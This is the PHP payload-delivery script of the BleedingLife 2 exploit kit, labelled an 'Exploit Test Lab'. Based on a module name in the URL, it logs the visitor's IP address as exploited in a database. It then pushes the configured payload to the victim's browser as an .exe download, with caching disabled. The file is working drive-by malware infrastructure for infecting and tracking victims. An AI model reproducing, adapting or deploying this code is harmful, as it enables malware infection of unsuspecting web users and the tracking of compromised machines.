<?
/*
BleedingLife 2 - Exploit Test Lab
Copyright (C) 2011 Blackhat Academy

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*/

include_once('config.php');
include_once('include/sql.php');
include_once('include/visitors.php');

$page = $_GET["e"];

$pos = strpos($page, "..");


if($page != "" && isset($page) && $pos === false ){
	$inc = "modules/" . $page . ".php";
	
	if(file_exists($inc)){
		
		$sql = new CSQL($sqlSettings);
		$sql->open();	
		$cvisitors = new CVisitors($sql, $sqlSettings);
		$cvisitors->setVisitorExploited($cvisitors->getIpAddr(), $page);
		$sql->close();

		$file_data = @file_get_contents("$payload_filename");
		header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
		header("Cache-Control: no-cache");
		header("Pragma: no-cache");
		header("Accept-Ranges: bytes\r\n");
		header("Content-Length: " . strlen($file_data) . "\r\n");
		header("Content-Disposition: inline; filename=" . $payload_filename . ".exe");
		header("\r\n");
		header("Content-Type: application/octet-stream\r\n\r\n");
		echo $file_data;	
	}else{
		
		exit();
	}

}else{
	
	exit();

}





?>
